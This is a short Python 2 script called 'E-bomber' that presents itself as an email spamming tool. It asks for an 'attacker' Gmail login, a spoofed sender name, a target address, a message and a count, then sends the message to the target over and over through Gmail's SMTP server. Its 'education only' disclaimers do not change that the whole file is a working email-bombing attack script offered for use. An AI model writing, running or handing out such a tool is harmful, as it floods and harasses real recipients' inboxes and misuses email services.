#!/usr/bin/python 2.7
# -*- coding: latin-1 -*-
#E-bomber
#This code for education purpose only.
#UI updates by @utsanjan
#Use it at your own risk !!!



import os
import smtplib
import getpass
import sys
import time

print "\n\n"
print "         ╔═════════════════════════════════════════════════════════╗"
print "         ║                                                         ║"
print "         ║     █▀▀ █▀▄▀█ ▄▀█ █ █░░   █▄▄ █▀█ █▀▄▀█ █▄▄ █▀▀ █▀█     ║"
print "         ║     ██▄ █░▀░█ █▀█ █ █▄▄   █▄█ █▄█ █░▀░█ █▄█ ██▄ █▀▄     ║"
print "         ║                                                         ║"
print "         ║═════════════════════════════════════════════════════════║"
print "         ║     T H E    E M A I L   S P A M M I N G    T O O L     ║"
print "         ║     -----------------------------------------------     ║"
print "         ║                   V E R S I O N: 2.0                    ║"
print "         ║═════════════════════════════════════════════════════════║"
print "         ║                                                         ║"
print "         ║            Modified by : Mohin Paramasivam              ║"
print "         ║            Only for Educational Purposes!!              ║"
print "         ║                                                         ║"
print "         ╚═════════════════════════════════════════════════════════╝"
print "\n\n"
print '    '

email = raw_input('Attacker Gmail Address : ')
print '             '
user = raw_input('Anonymous name : ')
print '      '
passwd = getpass.getpass('Password: ')

print '   '

to = raw_input('\nTo: ')


print '    '

body = raw_input('Message: ')

print '    '

total = input('Number of send: ')

smtp_server = 'smtp.gmail.com'
port = 587


print ''

try:
    server = smtplib.SMTP(smtp_server,port)
    server.ehlo()
    server.starttls()
    server.login(email,passwd)
    for i in range(1, total+1):
        subject = os.urandom(9)
        msg = 'From: ' + user + '\nSubject: ' + '\n' + body
        server.sendmail(email,to,msg)
        print "\rE-mails sent: %i" % i
        time.sleep(1)
        sys.stdout.flush()
    server.quit()
    print '\n Done !!!'
except KeyboardInterrupt:
    print '[-] Canceled'
    sys.exit()
except smtplib.SMTPAuthenticationError:
    print '\n[!] The username or password you entered is incorrect.'
    sys.exit()
